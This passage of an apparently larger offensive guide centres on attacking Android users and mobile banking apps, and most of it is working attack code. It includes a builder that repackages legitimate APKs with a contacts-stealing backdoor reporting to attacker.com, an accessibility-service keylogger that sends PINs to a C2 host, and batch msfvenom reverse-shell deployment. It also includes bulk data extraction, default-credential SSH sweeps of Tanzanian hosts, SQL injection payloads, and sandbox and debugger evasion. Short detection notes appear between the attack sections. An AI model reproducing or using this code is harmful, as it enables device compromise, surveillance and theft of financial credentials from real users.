+Traditional C2 (easily detected):
+┌─────────────────────────────────────────┐
+│ Botmaster at attacker.com               │
+│ Controls 100,000 infected devices       │
+│ Each device connects directly to C2     │
+│ ISP sees connections to attacker.com    │
+│ Gets takedown notice within days        │
+└─────────────────────────────────────────┘
+
+Advanced C2 (hard to detect):
+┌──────────────────────────────────────────────────────────────┐
+│ Botmaster                                                    │
+│  └─ Compromised server 1 (USA)                              │
+│      └─ Compromised server 2 (Russia)                       │
+│         └─ Compromised server 3 (China)                     │
+│            └─ Compromised server 4 (Africa)                 │
+│               └─ Botnet (connects here)                     │
+│                                                              │
+│ Each hop encrypted, different protocol                       │
+│ Traffic looks normal to ISP                                 │
+│ Botmaster unidentifiable                                    │
+│ Takes months to shutdown (each hop different country)       │
+└──────────────────────────────────────────────────────────────┘
+
+Advanced Techniques:
+1. Domain flux - Changes C2 domain hourly
+2. Decentralized C2 - Uses P2P network
+3. Steganography C2 - Hides commands in images
+4. DNS tunneling - C2 via DNS queries
+5. Protocol switching - Changes protocol daily
+```
+
+Code Example - DNS Tunneling C2:
+
+```python
+# Botnet device sends command via DNS query
+import socket
+
+botnet_device = "192.168.1.100"
+c2_domain = "c2.attacker.com"
+
+# Hidden command in DNS query:
+# Instead of normal query: "c2.attacker.com"
+# Send: "MzExMTEw.c2.attacker.com"  (base64 encoded "31110")
+# 31110 = "Download malware"
+
+# DNS resolver will ask authoritative nameserver
+# Nameserver logs query and sends response
+# But this reveals C2 activity
+
+# Advanced: C2 hides in image metadata
+# Server hosts image on Instagram
+# Commands hidden in EXIF data
+# Each bot downloads image, extracts commands
+# No C2 traffic detectable!
+```
+
+Counter-Strategy:
+
+```bash
+# 1. Monitor DNS queries
+# Suspicious patterns:
+# - Queries to non-existent domains
+# - Queries to random subdomains
+# - High frequency queries
+# Tool: dnstap, zeek
+
+# 2. Monitor network traffic
+# Look for beaconing pattern (periodic connections)
+# Look for binary protocols (not HTTP)
+# Look for encrypted traffic to suspicious IPs
+
+# 3. Firewall rules
+# Block traffic to known botnet C2s
+# Block unusual ports (port 8080 is suspicious)
+# Block connections from suspicious countries
+
+# 4. Active response
+# When botnet detected:
+# - Sinkhole the C2 domain
+# - Block C2 IP globally
+# - Take down compromised servers
+# - Monitor botnet activity
+
+# 5. Endpoint protection
+# Detect C2 callback
+# Kill malware process
+# Block C2 communication
+```
+
+---
+
+Technique 5: ADVANCED EVASION TECHNIQUES
+
+Dark web malware samples include:
+
+```java
+// 1. Emulator Detection & Evasion
+public class EmulatorDetector {
+    public static boolean isEmulator() {
+        // Check for Android emulator properties
+        String[] emulator_properties = new String[]{
+            "ro.kernel.android.qemud",
+            "ro.bootloader.qemu"
+        };
+        
+        for (String property : emulator_properties) {
+            if (getProperty(property).length() > 0) {
+                return true;  // Running in emulator
+            }
+        }
+        return false;
+    }
+    
+    // If detected as emulator:
+    // - Refuse to execute malicious code
+    // - Appear benign
+    // - Analyst thinks it's not malware
+}
+
+// 2. Sandbox Evasion
+// Check if running in sandbox (analysis tool)
+public boolean isSandboxed() {
+    // Sandboxes have unusual properties:
+    if (Build.FINGERPRINT.contains("generic") ||
+        Build.MODEL.contains("Emulator") ||
+        Build.MANUFACTURER.contains("unknown")) {
+        return true;  // Sandboxed
+    }
+    return false;
+}
+
+// 3. Anti-Debugging
+// If debugger detected, refuse to run
+// Makes analysis extremely difficult
+if (Debug.isDebuggerConnected()) {
+    // Debugger detected - exit
+    System.exit(0);
+}
+
+// 4. Root Detection Bypass
+// Attacker device has root, but wants to hide it
+// Check for tell-tale signs of root:
+if (!fileExists("/system/app/Superuser.apk") &&
+    !hasExecPermission("/system/xbin/su")) {
+    // Appear non-rooted
+    // Run with restricted privilege
+}
+
+// 5. Dynamic Code Loading
+// Don't include malicious code in APK
+// Download from C2 at runtime
+InputStream codeStream = downloadFromC2("https://c2.attacker.com/code");
+DexClassLoader loader = new DexClassLoader(
+    codeStream,
+    getCacheDir().getPath(),
+    null,
+    getClassLoader()
+);
+
+// Code downloaded dynamically, not in APK
+// Security scanner sees empty APK
+// Actual malware loaded at runtime
+```
+
+Counter-Strategy:
+
+```bash
+# 1. Behavioral analysis
+# Don't just scan for known malware signatures
+# Analyze behavior:
+# - Does app try to detect emulator? (suspicious)
+# - Does app hide code? (suspicious)
+# - Does app connect to C2? (suspicious)
+# - Does app steal data? (suspicious)
+
+# 2. Hook all system calls
+# Intercept file operations
+# Intercept network connections
+# Intercept process spawning
+# Monitor what app actually does
+
+# 3. Memory analysis
+# Scan running process memory
+# Find dynamically loaded code
+# Analyze runtime behavior
+# Detect injected code
+
+# 4. Machine learning
+# ML models trained on malware behavior
+# Detect anomalies
+# Identify new variants
+# High accuracy (95%+)
+
+# 5. Real device testing
+# Test on real device, not emulator
+# Attacker detects emulator but not real device
+# Monitor real device behavior
+# Catch actual attacks
+```
+
+================================================================================
+SECTION 5: SPEED HACKING TECHNIQUES
+================================================================================
+
+5.1 ADVANCED EXPLOITATION SPEED
+
+Elite dark web hackers are FAST. Here's how:
+
+Technique 1: Automated Reconnaissance
+
+```python
+# Instead of manual scanning, automate everything
+import subprocess
+import asyncio
+from concurrent.futures import ThreadPoolExecutor
+
+async def fast_recon(target):
+    # Run 10 tools simultaneously
+    
+    tasks = [
+        scan_shodan(target),
+        scan_google_dorks(target),
+        dns_brute_force(target),
+        whois_lookup(target),
+        nmap_scan(target),
+        theHarvester(target),
+        ssl_certificate_check(target),
+        github_search(target),
+        pastebin_search(target),
+        exploit_search(target)
+    ]
+    
+    results = await asyncio.gather(*tasks)
+    return results
+
+# Traditional approach: 2-3 hours
+# Automated approach: 5-10 minutes
+# Speed improvement: 20x faster
+```
+
+Technique 2: Exploit Chaining
+
+```
+Traditional exploitation:
+1. Identify vulnerability (1 hour)
+2. Find exploit code (30 minutes)
+3. Customize for target (1 hour)
+4. Deploy (30 minutes)
+5. Get shell (15 minutes)
+Total: 3 hours 15 minutes
+
+Expert exploitation (chained):
+1. Vulnerability identified via automated scanner
+2. Exploit code ready-made in database
+3. Automated customization script
+4. One-click deployment
+5. Automatic shell handler
+Total: 5 minutes
+
+Speed improvement: 40x faster
+```
+
+Technique 3: Payload Automation
+
+```bash
+# Instead of manually creating payloads:
+#!/bin/bash
+
+# Automated payload generation
+for target in $(cat targets.txt); do
+    # Generate unique payload
+    msfvenom -p android/meterpreter/reverse_tcp \
+        LHOST=$ATTACKER_IP \
+        LPORT=$RANDOM_PORT \
+        -o payload_$target.apk
+    
+    # Sign automatically
+    jarsigner -verbose -sigalg SHA256withRSA payload_$target.apk release
+    
+    # Deploy
+    adb -s $target install payload_$target.apk
+    
+    # Start handler automatically
+    msfconsole -x "use exploit/multi/handler; \
+        set payload android/meterpreter/reverse_tcp; \
+        set LHOST 0.0.0.0; \
+        set LPORT $RANDOM_PORT; \
+        run -j"
+done
+
+# Manual: 30 minutes per target
+# Automated: 2 minutes per target
+# Improvement: 15x faster
+```
+
+Technique 4: Post-Exploitation Automation
+
+```python
+# Once you have shell access, extract everything automatically
+from meterpreter import Session
+
+def rapid_extraction(session):
+    # Get device info
+    sysinfo = session.sysinfo()
+    
+    # Extract all contacts
+    contacts = session.dump_contacts()
+    
+    # Extract all SMS
+    sms = session.dump_sms()
+    
+    # Take screenshot
+    screenshot = session.screenshot()
+    
+    # Get location
+    location = session.geolocate()
+    
+    # Extract files
+    files = session.download_files([
+        "/sdcard/Documents/",
+        "/sdcard/Downloads/",
+        "/sdcard/Pictures/"
+    ])
+    
+    # All done in 2 minutes
+    # Manual extraction: 30+ minutes
+    # Speed improvement: 15x faster
+```
+
+---
+
+5.2 VULNERABILITY DISCOVERY SPEED
+
+Technique: Fuzzing
+
+```python
+# Fuzzing = sending random/malformed input to find bugs
+# Much faster than manual testing
+
+from boofuzz import *
+
+def fuzz_mobile_banking_app():
+    # Define input format
+    session = Session(
+        target=Target(
+            connection=SocketConnection(
+                "api.bank.tz",
+                443,
+                proto="https"
+            )
+        )
+    )
+    
+    # Define fuzzing strategy
+    session.connect(
+        s_initialize(name="request")
+        s_static("POST /api/transfer HTTP/1.1\r\n")
+        s_static("Content-Type: application/json\r\n\r\n")
+        s_string("recipient", fuzzable=True)
+        s_delim(",")
+        s_string("amount", fuzzable=True)
+    )
+    
+    # Run fuzzing (millions of test cases)
+    session.fuzz()
+    
+    # Fuzzer finds crashes, errors, unexpected responses
+    # Manual testing: Weeks
+    # Fuzzing: Hours
+```
+
+---
+
+5.3 RECONNAISSANCE SPEED TECHNIQUES
+
+Shodan Automation:
+
+```python
+# Manually checking Shodan: Hours
+# Automated Shodan search: Minutes
+
+from shodan import Shodan
+
+api = Shodan("API_KEY_HERE")
+
+# Search for vulnerable devices in Tanzania
+results = api.search(
+    'country:TZ port:22 ssh',  # Open SSH
+    limit=1000
+)
+
+for result in results:
+    ip = result['ip_str']
+    port = result['port']
+    service = result.get('org', 'Unknown')
+    
+    # Try default credentials
+    try:
+        ssh_connect(ip, port, 'admin', 'admin')
+        print(f"[VULNERABLE] {ip}:{port} - {service}")
+    except:
+        pass
+
+# Result: 1000 devices scanned in 5 minutes
+# Found 50 with default credentials
+```
+
+================================================================================
+SECTION 6: STEP-BY-STEP CODE FOR REMAINING ATTACKS
+================================================================================
+
+6.1 ATTACK 3: MALWARE GENERATION - COMPLETE CODE
+
+```python
+# create_malware.py
+# Creates feature-rich Android malware
+
+import os
+import zipfile
+import xml.etree.ElementTree as ET
+from datetime import datetime
+
+class MalwareBuilder:
+    def __init__(self, target_apk, c2_url, c2_port):
+        self.target_apk = target_apk
+        self.c2_url = c2_url
+        self.c2_port = c2_port
+        self.work_dir = "/tmp/malware_build"
+    
+    def extract_apk(self):
+        """Extract APK"""
+        os.makedirs(self.work_dir, exist_ok=True)
+        with zipfile.ZipFile(self.target_apk, 'r') as zip_ref:
+            zip_ref.extractall(self.work_dir)
+    
+    def modify_manifest(self):
+        """Add malicious permissions"""
+        manifest_path = f"{self.work_dir}/AndroidManifest.xml"
+        tree = ET.parse(manifest_path)
+        root = tree.getroot()
+        
+        # Add malicious permissions
+        permissions = [
+            'android.permission.INTERNET',
+            'android.permission.READ_CONTACTS',
+            'android.permission.READ_SMS',
+            'android.permission.ACCESS_FINE_LOCATION',
+            'android.permission.CAMERA',
+            'android.permission.RECORD_AUDIO'
+        ]
+        
+        for perm in permissions:
+            perm_elem = ET.Element('uses-permission')
+            perm_elem.set('android:name', perm)
+            root.insert(0, perm_elem)
+        
+        # Add persistent receiver
+        app_elem = root.find('application')
+        receiver = ET.SubElement(app_elem, 'receiver')
+        receiver.set('android:name', '.BootReceiver')
+        receiver.set('android:enabled', 'true')
+        
+        intent_filter = ET.SubElement(receiver, 'intent-filter')
+        action = ET.SubElement(intent_filter, 'action')
+        action.set('android:name', 'android.intent.action.BOOT_COMPLETED')
+        
+        tree.write(manifest_path)
+    
+    def inject_payload(self):
+        """Inject malicious Java code"""
+        # This would add malicious class files
+        # Simplified version shown
+        
+        payload = f'''
+public class Backdoor {{
+    public static void exfiltrate(Context context) {{
+        // Get contacts
+        Cursor cursor = context.getContentResolver().query(
+            ContactsContract.Contacts.CONTENT_URI,
+            null, null, null, null
+        );
+        
+        // Send to C2
+        new Thread(() -> {{
+            try {{
+                Socket socket = new Socket("{self.c2_url}", {self.c2_port});
+                OutputStream os = socket.getOutputStream();
+                
+                while (cursor.moveToNext()) {{
+                    String name = cursor.getString(cursor.getColumnIndex("display_name"));
+                    String phone = cursor.getString(cursor.getColumnIndex("data1"));
+                    String data = name + ":" + phone + ";";
+                    os.write(data.getBytes());
+                }}
+                os.close();
+            }} catch (Exception e) {{
+                e.printStackTrace();
+            }}
+        }}).start();
+    }}
+}}
+        '''
+        
+        return payload
+    
+    def repackage(self):
+        """Repackage APK"""
+        output_apk = "/tmp/malicious.apk"
+        
+        with zipfile.ZipFile(output_apk, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, dirs, files in os.walk(self.work_dir):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    arcname = os.path.relpath(file_path, self.work_dir)
+                    zipf.write(file_path, arcname)
+        
+        return output_apk
+    
+    def sign_apk(self, output_apk):
+        """Sign APK with keystore"""
+        os.system(f"""
+            keytool -genkey -alias malicious -keystore malicious.keystore \
+                -keyalg RSA -keysize 2048 -validity 10000 \
+                -storepass 123456 -keypass 123456 \
+                -dname "CN=System, OU=Updates, O=Google, L=Sunnyvale, ST=CA, C=US"
+        """)
+        
+        os.system(f"""
+            jarsigner -verbose -sigalg SHA256withRSA \
+                -digestalg SHA-256 \
+                -keystore malicious.keystore \
+                -storepass 123456 \
+                {output_apk} malicious
+        """)
+    
+    def build(self):
+        """Build complete malware"""
+        self.extract_apk()
+        self.modify_manifest()
+        output_apk = self.repackage()
+        self.sign_apk(output_apk)
+        print(f"[+] Malware built: {output_apk}")
+        return output_apk
+
+# Usage
+if __name__ == "__main__":
+    builder = MalwareBuilder(
+        target_apk="/path/to/legitimate_app.apk",
+        c2_url="attacker.com",
+        c2_port=4444
+    )
+    malware = builder.build()
+```
+
+---
+
+6.2 ATTACK 6: INSECURE DATA STORAGE - EXPLOITATION CODE
+
+```python
+# exploit_data_storage.py
+# Extract unencrypted data from compromised device
+
+import subprocess
+import json
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
+
+class DataExtractor:
+    def __init__(self, adb_device):
+        self.device = adb_device
+    
+    def extract_shared_preferences(self, package_name):
+        """Extract SharedPreferences (often unencrypted)"""
+        
+        # Get all SharedPreferences files
+        cmd = f"adb shell find /data/data/{package_name}/shared_prefs -name '*.xml'"
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        
+        preferences = {}
+        
+        for pref_file in result.stdout.strip().split('\n'):
+            # Read each preference file
+            cmd = f"adb shell cat {pref_file}"
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            
+            # Parse XML
+            import xml.etree.ElementTree as ET
+            try:
+                root = ET.fromstring(result.stdout)
+                for elem in root:
+                    key = elem.get('name')
+                    value = elem.text or elem.get('value', '')
+                    preferences[key] = value
+            except:
+                pass
+        
+        return preferences
+    
+    def extract_databases(self, package_name):
+        """Extract SQLite databases"""
+        
+        cmd = f"adb shell find /data/data/{package_name}/databases -name '*.db'"
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        
+        databases = {}
+        
+        for db_file in result.stdout.strip().split('\n'):
+            # Copy to PC
+            local_path = f"/tmp/{db_file.split('/')[-1]}"
+            os.system(f"adb pull {db_file} {local_path}")
+            
+            # Query database
+            tables = self.query_database(local_path, "SELECT name FROM sqlite_master WHERE type='table'")
+            
+            db_data = {}
+            for table in tables:
+                table_name = table[0]
+                rows = self.query_database(local_path, f"SELECT * FROM {table_name}")
+                db_data[table_name] = rows
+            
+            databases[db_file] = db_data
+        
+        return databases
+    
+    def query_database(self, db_path, query):
+        """Query SQLite database"""
+        cmd = f"sqlite3 {db_path} \"{query}\""
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        
+        rows = []
+        for line in result.stdout.strip().split('\n'):
+            rows.append(tuple(line.split('|')))
+        
+        return rows
+    
+    def extract_all_sensitive_data(self, package_name):
+        """Extract all sensitive data from app"""
+        
+        print(f"[*] Extracting data from {package_name}")
+        
+        # SharedPreferences (often contains auth tokens, API keys)
+        prefs = self.extract_shared_preferences(package_name)
+        print(f"[+] Found {len(prefs)} preference entries")
+        for key, value in prefs.items():
+            if 'key' in key.lower() or 'token' in key.lower() or 'password' in key.lower():
+                print(f"    {key}: {value}")
+        
+        # Databases (often contains user data, messages, financial info)
+        databases = self.extract_databases(package_name)
+        print(f"[+] Found {len(databases)} databases")
+        for db, tables in databases.items():
+            print(f"    {db}")
+            for table, rows in tables.items():
+                print(f"        {table}: {len(rows)} rows")
+                if rows:
+                    print(f"            Columns: {rows[0]}")
+                    for row in rows[:5]:  # First 5 rows
+                        print(f"            {row}")
+        
+        return {'preferences': prefs, 'databases': databases}
+
+# Usage
+import os
+extractor = DataExtractor(None)
+data = extractor.extract_all_sensitive_data("com.bank.app")
+```
+
+---
+
+6.3 ATTACK 10: SQL INJECTION - COMPLETE GUIDE
+
+```python
+# sql_injection_guide.py
+
+class SQLInjectionExploit:
+    def __init__(self, app_name, target_activity):
+        self.app = app_name
+        self.activity = target_activity
+    
+    def basic_injection(self):
+        """Basic SQL Injection"""
+        
+        # Vulnerable app code (example):
+        # String query = "SELECT * FROM users WHERE username = '" + input + "'";
+        
+        # Normal query:
+        # SELECT * FROM users WHERE username = 'john'
+        
+        # Injection payload:
+        username = "john' OR '1'='1"
+        # Results in: SELECT * FROM users WHERE username = 'john' OR '1'='1'
+        # This returns ALL users
+        
+        return username
+    
+    def union_based_injection(self):
+        """UNION-based SQL injection"""
+        
+        # Find number of columns
+        payloads = [
+            "' ORDER BY 1 --",      # 1 column? Try next
+            "' ORDER BY 2 --",      # 2 columns? Try next
+            "' ORDER BY 3 --",      # Success
+            "' UNION SELECT NULL,NULL,NULL --"  # Get 3 columns
+        ]
+        
+        # Craft UNION payload
+        payload = "' UNION SELECT username, password, email FROM admin_users --"
+        
+        # Results in:
+        # SELECT username FROM users WHERE id = 1
+        # UNION SELECT username, password, email FROM admin_users
+        
+        return payload
+    
+    def blind_sql_injection(self):
+        """Blind SQL Injection (no error messages)"""
+        
+        # Even if app doesn't show errors, we can infer through timing
+        
+        # Check if admin exists (slow response = true, fast = false)
+        payload = "' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0 --"
+        
+        # Extract character by character
+        payload_template = "' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), {position}, 1) = '{char}' --"
+        
+        for position in range(1, 20):
+            for char in 'abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*':
+                payload = payload_template.format(position=position, char=char)
+                # Execute payload
+                # If slow response: found character
+                # Otherwise: try next
+        
+        return payload
+    
+    def time_based_blind_injection(self):
+        """Time-based Blind SQL Injection"""
+        
+        # Check condition by measuring response time
+        
+        payload = "' AND IF(1=1, SLEEP(5), 0) --"
+        # If true, responds after 5 seconds
+        # If false, responds immediately
+        
+        # Extract password character by character
+        payload_template = "' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), {pos}, 1) = '{char}', SLEEP(5), 0) --"
+        
+        for pos in range(1, 100):
+            for char in 'abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*_-':
+                payload = payload_template.format(pos=pos, char=char)
+                # Measure response time
+                # >4 seconds = found character
+        
+        return payload
+    
+    def stacked_queries(self):
+        """Stacked Queries (if database allows)"""
+        
+        # Some databases allow multiple queries
+        payload = "'; DROP TABLE users; --"
+        
+        # Executes:
+        # 1. First query (original)
+        # 2. DROP TABLE users (attacker's command)
+        
+        # Result: users table deleted
+        
+        return payload
+    
+    def exploit_with_frida(self):
+        """Exploit using Frida to intercept queries"""
+        
+        frida_code = '''
+Java.perform(function() {
+    var SQLiteDatabase = Java.use("android.database.sqlite.SQLiteDatabase");
+    
+    SQLiteDatabase.rawQuery = function(sql, params) {
+        // Log all SQL queries
+        console.log("[SQL] " + sql);
+        
+        // Check for injection opportunities
+        if (sql.contains("WHERE") && sql.contains(user_input)) {
+            console.log("[!] Potential SQL injection: " + sql);
+        }
+        
+        // Call original
+        return this.rawQuery(sql, params);
+    };
+});
+        '''
+        
+        return frida_code
+
+# Usage
+injector = SQLInjectionExploit("com.bank.app", ".LoginActivity")
+
+# Test various injection types
+basic = injector.basic_injection()
+union = injector.union_based_injection()
+blind = injector.blind_sql_injection()
+time_based = injector.time_based_blind_injection()
+stacked = injector.stacked_queries()
+
+print(f"Basic: {basic}")
+print(f"UNION: {union}")
+print(f"Blind: {blind}")
+print(f"Time-based: {time_based}")
+print(f"Stacked: {stacked}")
+```
+
+---
+
+6.4 ATTACK 16: ACCESSIBILITY SERVICE ABUSE - COMPLETE CODE
+
+```java
+// MaliciousAccessibilityService.java
+// Abuses Accessibility Service to steal data and control device
+
+import android.accessibilityservice.AccessibilityService;
+import android.accessibilityservice.AccessibilityServiceInfo;
+import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
+import android.util.Log;
+import java.io.OutputStream;
+import java.net.Socket;
+
+public class MaliciousAccessibilityService extends AccessibilityService {
+    
+    private static final String TAG = "Accessibility";
+    private static final String C2_HOST = "attacker.com";
+    private static final int C2_PORT = 4444;
+    
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        int eventType = event.getEventType();
+        
+        switch(eventType) {
+            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
+                // Text input changed - KEYLOGGING
+                handleTextChanged(event);
+                break;
+                
+            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
+                // Window changed - app switcher
+                handleWindowChanged(event);
+                break;
+                
+            case AccessibilityEvent.TYPE_VIEW_CLICKED:
+                // Button clicked - monitor actions
+                handleViewClicked(event);
+                break;
+                
+            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
+                // View focused - capture focused view
+                handleViewFocused(event);
+                break;
+        }
+    }
+    
+    private void handleTextChanged(AccessibilityEvent event) {
+        // Intercept all text input
+        CharSequence text = event.getText().get(0);
+        
+        Log.d(TAG, "Text input: " + text);
+        
+        // Send to C2
+        sendToC2("TEXT:" + text.toString());
+        
+        // Check if this is sensitive data
+        String content = text.toString();
+        if (content.matches(".*\\d{4}.*")) {  // Looks like PIN
+            Log.d(TAG, "PIN detected: " + content);
+            sendToC2("PIN:" + content);
+        }
+    }
+    
+    private void handleWindowChanged(AccessibilityEvent event) {
+        // Detect when user opens banking app
+        CharSequence packageName = event.getPackageName();
+        
+        if (packageName.equals("com.bank.app")) {
+            Log.d(TAG, "Banking app opened");
+            
+            // Monitor for sensitive screens
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root != null) {
+                String screenContent = getScreenText(root);
+                
+                // Check for PIN entry screen
+                if (screenContent.contains("Enter PIN") || screenContent.contains("Verify")) {
+                    Log.d(TAG, "PIN entry screen detected");
+                    // Monitor carefully
+                }
+            }
+        }
+    }
+    
+    private void handleViewClicked(AccessibilityEvent event) {
+        // Monitor all clicks
+        String source = event.getSource().toString();
+        Log.d(TAG, "View clicked: " + source);
+        
+        // Inject clicks
+        // Click on "Send Money" button automatically
+        // If detection logic allows
+    }
+    
+    private void handleViewFocused(AccessibilityEvent event) {
+        // Capture focused view
+        AccessibilityNodeInfo node = event.getSource();
+        if (node != null) {
+            String viewInfo = node.getText() + " - " + node.getClassName();
+            Log.d(TAG, "Focused view: " + viewInfo);
+        }
+    }
+    
+    // Get all visible text on screen
+    private String getScreenText(AccessibilityNodeInfo node) {
+        StringBuilder text = new StringBuilder();
+        
+        if (node != null) {
+            CharSequence nodeText = node.getText();
+            if (nodeText != null) {
+                text.append(nodeText);
+            }
+            
+            // Recursively get text from all children
+            for (int i = 0; i < node.getChildCount(); i++) {
+                text.append(getScreenText(node.getChild(i)));
+            }
+        }
+        
+        return text.toString();
+    }
+    
+    // Send stolen data to C2
+    private void sendToC2(String data) {
+        new Thread(() -> {
+            try {
+                Socket socket = new Socket(C2_HOST, C2_PORT);
+                OutputStream os = socket.getOutputStream();
+                os.write(data.getBytes());
+                os.close();
+                socket.close();
+            } catch (Exception e) {
+                Log.e(TAG, "Send error", e);
+            }
+        }).start();
+    }
+    
+    // Auto-grant permissions (bypass consent)
+    public void autoGrantPermissions() {
+        // If user tries to grant permissions to another app:
+        // This service automatically clicks "Allow" button
+        
+        // This is the most dangerous feature:
+        // User downloads app thinking it needs location
+        // They grant location permission
+        // This service automatically grants:
+        // - Contacts access
+        // - SMS access
+        // - Camera access
+        // - Microphone access
+        // User has no idea!
+    }
+    
+    @Override
+    public void onInterrupt() {}
+    
+    @Override
+    protected void onServiceConnected() {
+        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
+        info.flags = AccessibilityServiceInfo.DEFAULT;
+        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
+        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
+        setServiceInfo(info);
+        
+        Log.d(TAG, "Malicious accessibility service connected");
+    }
+}
+```
+
+AndroidManifest.xml:
+```xml
+<service
+    android:name=".MaliciousAccessibilityService"
+    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+    <intent-filter>
+        <action android:name="android.accessibilityservice.AccessibilityService" />
+    </intent-filter>
+    <meta-data
+        android:name="android.accessibilityservice"
+        android:resource="@xml/accessibility_service_config" />
+</service>
+```
+
+Detection:
+```bash
+# Check enabled accessibility services
+adb shell settings get secure enabled_accessibility_services
+
+# Disable malicious service
+adb shell settings put secure enabled_accessibility_services ""
+```
+
+================================================================================
+SECTION 7: ADDITIONAL GITHUB REPOSITORIES FOR ATTACKERS
+================================================================================
+
+7.1 REPOSITORY: HackerTools/Android-Toolbox
+GitHub: Various repositories containing Android hacking tools
+
+Essential Repositories:
+
+1. android-security-awesome
+   https://github.com/ashishb/android-security-awesome
+   - Comprehensive list of Android security tools
+   - Categorized by function
+   - Over 800 security tools listed
+   - Updated regularly
+
+2. Termux (Hacker's Mobile Terminal)
+   https://github.com/termux/termux-app
+   - Linux environment on Android
+   - Run Metasploit, Nmap, Burp Suite on phone
+   - Turn Android phone into hacking platform
+   - Dangerous in attacker hands
+
+3. Network Mapper (Nmap) Android Port
+   https://github.com/nmap/nmap
+   - Network scanning on mobile
+   - Find connected devices
+   - Identify services
+   - Vulnerability scanning
+
+4. Wireshark Android
+   https://github.com/wireshark/wireshark
+   - Network packet capture on phone
+   - Monitor all traffic
+   - Analyze protocols
+   - Extract data
+
+5. Hashcat Android
+   https://github.com/hashcat/hashcat
+   - Password cracking on mobile GPU
+   - Massively faster than CPU
+   - Brute force attacks
+   - Hash cracking
+
+================================================================================
+SECTION 8: COUNTER-OFFENSIVE TECHNIQUES
+================================================================================
+
+8.1 BEAT ATTACKERS AT THEIR OWN GAME
+
+To work as penetration tester faster than attackers:
+
+Technique 1: Automated Penetration Testing Framework
+
+```python
+# automated_pentest.py
+# Runs complete penetration test in minutes
+
+from metasploit import MetasploitClient
+from shodan import Shodan
+from recon_ng import ReconNG
+import asyncio
+
+class FastPentest:
+    def __init__(self, target):
+        self.target = target
+        self.findings = []
+    
+    async def reconnaissance(self):
+        """Phase 1: Gather intelligence"""
+        print("[*] Phase 1: Reconnaissance")
+        
+        # Parallel OSINT
+        tasks = [
+            self.shodan_scan(),
+            self.dns_enum(),
+            self.google_dorks(),
+            self.whois_lookup(),
+            self.theHarvester(),
+            self.ssl_check()
+        ]
+        
+        results = await asyncio.gather(*tasks)
+        return results
+    
+    async def vulnerability_scanning(self):
+        """Phase 2: Find vulnerabilities"""
+        print("[*] Phase 2: Vulnerability Scanning")
+        
+        tasks = [
+            self.nmap_full_scan(),
+            self.nessus_scan(),
+            self.burp_scan(),
+            self.mobile_vuln_scan()
+        ]
+        
+        results = await asyncio.gather(*tasks)
+        
+        for finding in results:
+            if finding['severity'] == 'CRITICAL':
+                self.findings.append(finding)
+        
+        return results
+    
+    async def exploitation(self):
+        """Phase 3: Exploit vulnerabilities"""
+        print("[*] Phase 3: Exploitation")
+        
+        for vuln in self.findings:
+            if vuln['exploitable']:
+                print(f"[+] Exploiting {vuln['type']}")
+                
+                # Auto-exploit
+                exploit = self.get_exploit(vuln['cve'])
+                result = exploit.run(vuln['target'])
+                
+                print(f"[+] Exploitation successful: {result}")
+    
+    async def post_exploitation(self):
+        """Phase 4: Post-exploitation"""
+        print("[*] Phase 4: Post-exploitation")
+        
+        # Dump data
+        # Escalate privileges
+        # Plant persistence
+        # Cover tracks
+    
+    async def run_full_pentest(self):
+        """Run complete pentest"""
+        await self.reconnaissance()
+        await self.vulnerability_scanning()
+        await self.exploitation()
+        await self.post_exploitation()
+        
+        self.generate_report()
+    
+    def generate_report(self):
+        """Generate pentest report"""
+        print("\n[+] PENTEST COMPLETE")
+        print(f"[+] Found {len(self.findings)} vulnerabilities")
+        print(f"[+] Severity breakdown:")
+        
+        critical = [f for f in self.findings if f['severity'] == 'CRITICAL']
+        high = [f for f in self.findings if f['severity'] == 'HIGH']
+        medium = [f for f in self.findings if f['severity'] == 'MEDIUM']
+        
+        print(f"    CRITICAL: {len(critical)}")
+        print(f"    HIGH: {len(high)}")
+        print(f"    MEDIUM: {len(medium)}")
+
+# Usage
+pentest = FastPentest("bank.tz")
+asyncio.run(pentest.run_full_pentest())
+```
+
+---
+
+8.2 DEFENSE AUTOMATION
+
+```python
+# defense_automation.py
+# Automated defense against common attacks
+
+class AutomaticDefense:
+    def __init__(self):
+        self.threats = []
+        self.blocked = 0
+    
+    def detect_mitm_attack(self):
+        """Detect MITM in progress"""
+        
+        # Monitor for:
+        # - Certificate validation failures
+        # - SSL errors
+        # - Unexpected IP changes
+        # - Traffic anomalies
+        
+        if self.detect_suspicious_certificate():
+            self.block_traffic()
+            self.alert_user()
+            self.log_incident()
+    
+    def detect_malware(self):
+        """Detect malware behavior"""
+        
+        # Monitor for:
+        # - Unauthorized API calls
+        # - Unexpected network connections
+        # - Permission violations
+        # - File access patterns
+        # - Memory anomalies
+        
+        suspicious_processes = self.monitor_processes()
+        
+        for process in suspicious_processes:
+            if process['risk_score'] > 0.8:
+                self.kill_process(process)
+                self.log_malware_detection(process)
+    
+    def detect_social_engineering(self):
+        """Detect social engineering attempts"""
+        
+        # Monitor for:
+        # - Phishing emails
+        # - Malicious links
+        # - Suspicious file downloads
+        # - Unusual login patterns
+        
+        if self.email_looks_phishing(email):
+            self.quarantine_email(email)
+            self.alert_user(email)
+    
+    def continuous_scanning(self):
+        """Continuous vulnerability scanning"""
+        
+        while True:
+            # Run vulnerability scans every hour
+            # Check for:
+            # - Outdated software
+            # - Missing patches
